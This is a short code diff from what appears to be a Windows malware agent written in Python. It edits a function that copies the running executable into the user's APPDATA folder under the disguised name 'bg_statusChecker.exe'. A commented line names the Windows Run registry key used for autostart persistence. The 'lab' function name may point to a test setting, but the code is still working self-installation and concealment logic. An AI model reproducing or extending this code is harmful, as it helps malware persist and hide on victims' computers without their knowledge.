@@ -228,10 +228,11 @@ def labActionLoop(init_message):
 
 def copySelfToKnowPath():
     import os
-    known_path = os.path.join(os.getenv("APPDATA"), "bg_agent.exe")
+    import sys
+    known_path = os.path.join(os.getenv("APPDATA"), "bg_statusChecker.exe")
     if not os.path.exists(known_path):
         import shutil
-        shutil.copy2(os.path.abspath(__file__), known_path)
+        shutil.copy2(sys.executable, known_path)
     return known_path
 
 # PERSISTENCE_REGKEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
